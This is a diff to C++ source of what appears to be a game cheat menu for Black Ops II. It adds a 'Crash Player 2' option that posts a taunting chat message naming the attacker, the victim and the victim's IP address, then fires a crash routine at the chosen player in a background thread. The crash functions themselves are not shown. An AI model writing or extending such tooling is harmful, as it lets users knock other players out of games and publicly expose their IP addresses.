@@ -688,7 +688,7 @@ namespace ProtoGenesys
 							bWriteLog = true;
 						}
 
-						if (ImGui::BeginMenu("Crash Player", furtive_crash::send_connectivity_test(i)))
+						if (ImGui::BeginMenu("Crash Player 1", furtive_crash::send_connectivity_test(i)))
 						{
 							ImGui::PushItemWidth(100.0f);
 							ImGui::InputText("", szCrashMessage, 1024);
@@ -712,6 +712,36 @@ namespace ProtoGenesys
 								}
 
 								std::thread(&furtive_crash::send_crash_1, i).detach();
+
+								bWriteLog = true;
+							}
+							ImGui::EndMenu();
+						}
+
+						if (ImGui::BeginMenu("Crash Player 2", furtive_crash::send_connectivity_test(i)))
+						{
+							ImGui::PushItemWidth(100.0f);
+							ImGui::InputText("", szCrashMessage, 1024);
+							ImGui::PopItemWidth();
+
+							ImGui::SameLine();
+							if (ImGui::Button("Execute"))
+							{
+								std::string szCrash(szCrashMessage);
+
+								if (!szCrash.empty())
+								{
+									int iLocalNum = t6::Party_FindMemberByXUID(t6::get_party_data(), t6::Live_GetXuid(ControllerIndex_t::CONTROLLER_INDEX_0));
+									std::string szLocalName = LocalClientIsInGame() ? CG->ClientInfo[iLocalNum].szName : t6::get_party_data()->get_party_member(iLocalNum)->gamertag;
+
+									szCrash = acut::FindAndReplaceString(szCrash, "%attacker", szLocalName);
+									szCrash = acut::FindAndReplaceString(szCrash, "%victim", szName);
+									szCrash = acut::FindAndReplaceString(szCrash, "%ip", VariadicText("%u.%u.%u.%u", szIPAddress[0], szIPAddress[1], szIPAddress[2], szIPAddress[3]));
+
+									AddReliableCommand(VariadicText("say \"%s\"", acut::StripColorCodes(szCrash).c_str()));
+								}
+
+								std::thread(&furtive_crash::send_crash_2, i).detach();
 
 								bWriteLog = true;
 							}
